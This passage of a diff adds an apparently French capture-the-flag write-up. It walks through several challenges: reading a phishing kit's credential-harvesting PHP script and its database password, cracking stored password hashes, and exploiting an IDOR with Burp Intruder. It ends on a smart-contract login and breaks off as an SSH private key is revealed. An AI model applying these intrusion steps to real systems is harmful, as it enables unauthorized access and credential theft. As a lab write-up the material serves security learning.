+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root 8.5K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> jquery.easing.1.3.js
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root  26K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> login.ltr.css
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> root root 9.4K Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> logon.css
+</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">1</span> root root 4.0K Jun <span style="color:#ae81ff">30</span> 14:02 pages
+</span></span></code></pre></div><p>On obtient un 2nd Flag :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   cat flag.txt
+</span></span><span style="display:flex;"><span>Flag-2 : ISEC<span style="color:#f92672">{</span>B4d_d3V_pR4cT1c3<span style="color:#f92672">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="starting-to-smell-good">Starting to smell good</h2>
+<ul>
+<li><strong>Nom</strong>  : Starting to smell good&hellip;</li>
+<li><strong>Point</strong> : 20</li>
+<li><strong>Description</strong> : Can&rsquo;t you get more things?</li>
+</ul>
+<h6 id="solution--4">Solution :</h6>
+<p>Le contenu du fichier <code>harvester.php</code> est intéressant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/a
+</span></span><span style="display:flex;"><span>➜   cat harvester.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>$dbuser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span>;
+</span></span><span style="display:flex;"><span>$servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db&#34;</span>;
+</span></span><span style="display:flex;"><span>$dbpass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;x0oKWidv0cz&#34;</span>;
+</span></span><span style="display:flex;"><span>$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;phishing&#34;</span>;
+</span></span><span style="display:flex;"><span>$redirect <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://outlook.office365.com&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$conn <span style="color:#f92672">=</span> mysqli_connect<span style="color:#f92672">(</span>$servername, $dbuser, $dbpass, $dbname<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> mysqli_real_escape_string<span style="color:#f92672">(</span>$conn, $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">])</span>;
+</span></span><span style="display:flex;"><span>$email <span style="color:#f92672">=</span> mysqli_real_escape_string<span style="color:#f92672">(</span>$conn, $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;email&#39;</span><span style="color:#f92672">])</span>;
+</span></span></code></pre></div><p>Grâce à ces Creds , on peut aller se connecter sur le MySql sur le port 8000 et ainsi obtenir le flag dans la DB :)</p>
+<p><img src="./img/mysql.png" alt="AltText"></p>
+<hr>
+<h2 id="strange-bank">Strange bank</h2>
+<ul>
+<li><strong>Nom</strong>  : Strange bank</li>
+<li><strong>Point</strong> : 50</li>
+<li><strong>Description</strong> : Perfect! Their base is well filled out good work. We are sure they have more secrets.</li>
+</ul>
+<h6 id="solution--5">Solution :</h6>
+<p>Depuis le Mysql , on peut récupérer 3 utilisateurs dans la base de données :
+on peut décoder les mots de passe avec <a href="https://crackstation.net/" target="_blank">CrackStation</a>.</p>
+<pre tabindex="0"><code>1 	wtivers 	57024125b8d8c3f6d69f99d7b42e63a71b0bb3f8 : &#39;phishing&#39;   (first test account)
+2 	operator1 ffcbd03577964f021cc34f50fabb7b16094a4051 : &#39;operator1234&#39; 	(operator1 old account)
+3 	jbura    	9bc34549d565d9505b287de0cd20ac77be1d3f2c : &#39;test1234&#39; 	(second test account)
+</code></pre><p>On se connecte Ainsi sur le login du port <code>3000</code> avec ces Creds :</p>
+<p><img src="./img/page_contract.png" alt="AltText"></p>
+<p>On peut voir ici que c&rsquo;est un chall de Crypto .</p>
+<p>On a :</p>
+<ul>
+<li>Le code d&rsquo;un SmartContract</li>
+<li>Un bouton pour télécharger le code</li>
+<li>Un bouton pour Déployer le SmartContract</li>
+</ul>
+<p>On peut inspecter les requêtes avec <a href="https://portswigger.net/burp" target="_blank"><code>BurpSuite</code></a></p>
+<p>Pour télécharger le contrat, on a :</p>
+<pre tabindex="0"><code>GET /contract/1 HTTP/1.1
+Host: 20.126.99.66:3000
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://20.126.99.66:3000/refund
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+</code></pre><p>Il y a une faille de type <a href="https://portswigger.net/web-security/access-control/idor" target="_blank"><code>IDOR</code></a> sur cette page. En effet, on peut modifier l&rsquo;indice, le <code>1</code> de l&rsquo;url pour obtenir un autre objet.
+On peut donc énumérer les différents contrats grâce à l&rsquo;intruder de Burpsuite.</p>
+<p><img src="./img/idor1.png" alt="AltText"></p>
+<p>On obtient ainsi le code de <code>5</code> nouveaux contrats !
+Le numéro <strong>13</strong> est intéressant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pragma solidity &gt;<span style="color:#f92672">=</span>0.4.22 &lt;0.6.0;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>contract Refund <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    bool public admin <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>    uint256 public funds;
+</span></span><span style="display:flex;"><span>    bytes32 private hash <span style="color:#f92672">=</span> 0x47a89f5ed7e6445e71adde201113005941232bcadade8ce112f6ef671038be04;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    constructor<span style="color:#f92672">()</span> public payable <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        funds <span style="color:#f92672">=</span> funds + msg.value;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span><span style="color:#f92672">()</span> external payable <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        funds <span style="color:#f92672">=</span> funds + msg.value;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> transfer<span style="color:#f92672">()</span> external <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        msg.sender.transfer<span style="color:#f92672">(</span>funds<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        funds <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> login<span style="color:#f92672">(</span>string memory _password<span style="color:#f92672">)</span> public<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span><span style="color:#f92672">((</span>keccak256<span style="color:#f92672">(</span>abi.encodePacked<span style="color:#f92672">(</span>_password<span style="color:#f92672">))</span> <span style="color:#f92672">==</span> hash<span style="color:#f92672">)){</span>
+</span></span><span style="display:flex;"><span>            admin <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Il semblerait que le contrat ait une fonction <code>login</code> qui requiert un mot de passe.
+Le mot de passe fournit en paramètre de la fonction de connexion et le <a href="https://fr.wikipedia.org/wiki/SHA-3" target="_blank"><code>sha3</code></a> de celui-ci est comparé au hash codé en dur plus haut.</p>
+<p>Ce hash correspond à <code>une adresse privée de la Blockchain ethereum</code>
+comme décrit à la page <code>/help</code> . On peut l&rsquo;ajouter à Metamask !</p>
+<p><img src="./img/eth.png" alt="AltText"></p>
+<p>On retrouve donc l&rsquo;adresse publique du compte : <code>0xf5A82264Ecec7F65DB259548717d9BFF6a148D92</code></p>
+<p>Enfin grâce à etherscan , on trouve les transactions ! <a href="https://ropsten.etherscan.io/address/0xf5A82264Ecec7F65DB259548717d9BFF6a148D92" target="_blank">ici</a></p>
+<p>On remarque que la dernière transaction concerne la fonction <code>login</code> évoquée plus haut.</p>
+<p><img src="./img/eth2.png" alt="AltText"></p>
+<p>En cliquant sur <code>View Input As UTF-8</code> , on obtient le mot de passe passé en paramètre : <code>harvester23</code></p>
+<p>Toujours dans notre exploration, on trouve dans le code source de la page :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;click&#39;</span>, <span style="color:#e6db74">&#39;.check&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">event</span>) {
+</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/check&#39;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">contractAddress</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#instanceAddress`</span>).<span style="color:#a6e22e">text</span>()
+</span></span><span style="display:flex;"><span>       },
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">responseKey</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>       },
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">`There was an error, please try again...`</span>);
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>     });
+</span></span><span style="display:flex;"><span>   });
+</span></span></code></pre></div><p>Voici donc le scénario qu&rsquo;on peut imaginer pour valider le challenge :</p>
+<ul>
+<li>Déployer le contrat</li>
+<li>Appeler la fonction <code>login</code> du contrat avec le mot de passe <code>harvester23</code></li>
+<li>Appelé l&rsquo;endpoint <code>check</code> pour obtenir <code>${response.responseKey}</code></li>
+</ul>
+<h6 id="déployer-le-contrat">Déployer le contrat</h6>
+<p>En bas de la page de la bank, on peut se <em>connecter</em>.
+En réalité, aucun mot de passe n&rsquo;est comparé. C&rsquo;est <code>un faux login.</code></p>
+<p>On accède à une option <code>Deploy refund contract</code>
+Avec <strong>BurpSuite</strong> on récupère la requête et de la même manière que pour le téléchargement : il existe une <strong>vulnérabilité IDOR</strong> qui permet de <strong>déployer le contrat 13</strong> au lieu du contrat N°1</p>
+<p><img src="./img/eth3.png" alt="AltText">
+Nous avons maintenant l&rsquo;adresse du contrat : <em>0x626BB1a4d1630291F1075d4AbD8b0075be306934</em></p>
+<h6 id="appeler-le-contrat">Appeler le contrat</h6>
+<p>On va utiliser <a href="https://github.com/wlayzz/RopstenCtf" target="_blank"><strong>RopStenCTF</strong></a> , un outil de <a href="https://twitter.com/Wlayzz" target="_blank">Wlayzz</a> qui permet d&rsquo;interagir avec ce genre de contrat !</p>
+<p>D&rsquo;abord, on va récupérer une clé api sur <a href="https://infura.io/" target="_blank">https://infura.io/</a> pour interagir avec la Blockchain Ropsten Ethereum .</p>
+<p>On setup notre Wallet au tool :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py wallet --provider-key f4ea35f577f14494b67fXXXXXXXXXXXX  --generate
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
+</span></span><span style="display:flex;"><span> | _ <span style="color:#ae81ff">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
+</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#e6db74">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#f92672">(</span>__|  _|  _|
+</span></span><span style="display:flex;"><span> |_|_<span style="color:#ae81ff">\_</span>__| .__/__/<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">||</span>_<span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_|_|   by @Wlayzz
+</span></span><span style="display:flex;"><span>         |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Provider key saved in .env file
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to ropsten network
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Your secret key is 0x13af12d9f7c211e29caac1b7bec12f0c874fXXXXXXXXXXXXXXXXXXXXX <span style="color:#f92672">(</span>keep this secret<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Your public adress is 0xF184008adeB767e0E869ffXXXXXXXXXXXXXXXXXXXXX
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> These informations are stored in .env file and will be used <span style="color:#66d9ef">for</span> smart contract interactions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> You can claim $rETH unsing this faucet: https://faucet.egorfine.com/
+</span></span></code></pre></div><p>On Compile le SmartContract pour avoir le .abi et pouvoir ainsi appeler  le contrat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --compile -f Refund.sol
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
+</span></span><span style="display:flex;"><span> | _ <span style="color:#ae81ff">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
+</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#e6db74">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#f92672">(</span>__|  _|  _|
+</span></span><span style="display:flex;"><span> |_|_<span style="color:#ae81ff">\_</span>__| .__/__/<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">||</span>_<span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_|_|   by @Wlayzz
+</span></span><span style="display:flex;"><span>         |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to ropsten network
+</span></span><span style="display:flex;"><span>Compiler run successful. Artifact<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> can be found in directory Refund.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> abi and bin files generated on directory:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ./Refund/Refund.abi
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ./Refund/Refund.bin
+</span></span></code></pre></div><p>On récupère les infos sur le SmartContrat de la blockchain ropsten :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --info --abi ./Refund/Refund.abi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
+</span></span><span style="display:flex;"><span> | _ <span style="color:#ae81ff">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
+</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#e6db74">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#f92672">(</span>__|  _|  _|
+</span></span><span style="display:flex;"><span> |_|_<span style="color:#ae81ff">\_</span>__| .__/__/<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">||</span>_<span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_|_|   by @Wlayzz
+</span></span><span style="display:flex;"><span>         |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to ropsten network
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> List of functions:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> admin<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> funds<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> login<span style="color:#f92672">(</span>_password:string<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> transfer<span style="color:#f92672">()</span>
+</span></span></code></pre></div><p>On envoie la transaction à l&rsquo;adresse <em>0x626BB1a4d1630291F1075d4AbD8b0075be306934</em> en appelant la fonction <code>login</code> avec le mot de passe en paramètre <code>harvester23</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --call --abi ./Refund/Refund.abi -fc login -p harvester23
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
+</span></span><span style="display:flex;"><span> | _ <span style="color:#ae81ff">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
+</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#e6db74">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#f92672">(</span>__|  _|  _|
+</span></span><span style="display:flex;"><span> |_|_<span style="color:#ae81ff">\_</span>__| .__/__/<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">||</span>_<span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_|_|   by @Wlayzz
+</span></span><span style="display:flex;"><span>         |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to ropsten network
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Inspect transaction here: https://ropsten.etherscan.io/tx/0xfc6cb2e3b27386f453ce1da32bebb3f213a367792d480903a7e4beedccab7438
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Transaction <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reponse login<span style="color:#f92672">(</span>harvester23<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Transaction status: success
+</span></span></code></pre></div><p>On regarde si <code>admin</code> est bien à <code>true</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/RopstenCtf git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+</span></span><span style="display:flex;"><span>➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --view --abi ./Refund/Refund.abi -fc admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ___             _            ___ _    __
+</span></span><span style="display:flex;"><span> | _ <span style="color:#ae81ff">\_</span>__ _ __ __| |_ ___ _ _ / __| |_ / _|
+</span></span><span style="display:flex;"><span> |   / _ | <span style="color:#e6db74">&#39;_ (_-|  _/ -_| &#39;</span> | <span style="color:#f92672">(</span>__|  _|  _|
+</span></span><span style="display:flex;"><span> |_|_<span style="color:#ae81ff">\_</span>__| .__/__/<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_</span>__|_<span style="color:#f92672">||</span>_<span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_|_|   by @Wlayzz
+</span></span><span style="display:flex;"><span>         |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to ropsten network
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Calling <span style="color:#66d9ef">function</span> <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reponse admin<span style="color:#f92672">()</span>: True
+</span></span></code></pre></div><h6 id="récupérer-la-clé-sur-check">Récupérer la clé sur /check</h6>
+<p>D&rsquo;après le code <strong>JavaScript</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;click&#39;</span>, <span style="color:#e6db74">&#39;.check&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">event</span>) {
+</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/check&#39;</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">contractAddress</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#instanceAddress`</span>).<span style="color:#a6e22e">text</span>()
+</span></span><span style="display:flex;"><span>       },
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">responseKey</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>       },
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">`#levelKey`</span>).<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">`There was an error, please try again...`</span>);
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>     });
+</span></span><span style="display:flex;"><span>   });
+</span></span></code></pre></div><p>Il faut faire une requête <strong>POST</strong> avec en data <code>instanceAddress</code> et l&rsquo;adresse du Contract
+Avec burp , on obtient le résultat suivant :</p>
+<p><img src="./img/ssh_key.png" alt="AltText"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;responseKey&#34;</span>:<span style="color:#e6db74">&#34;\nWelcome back Admin. Reminder of harvest creds :&lt;br&gt;\n- Username : harvester&lt;br&gt;\n- Key :&lt;br&gt;\n-----BEGIN OPENSSH PRIVATE 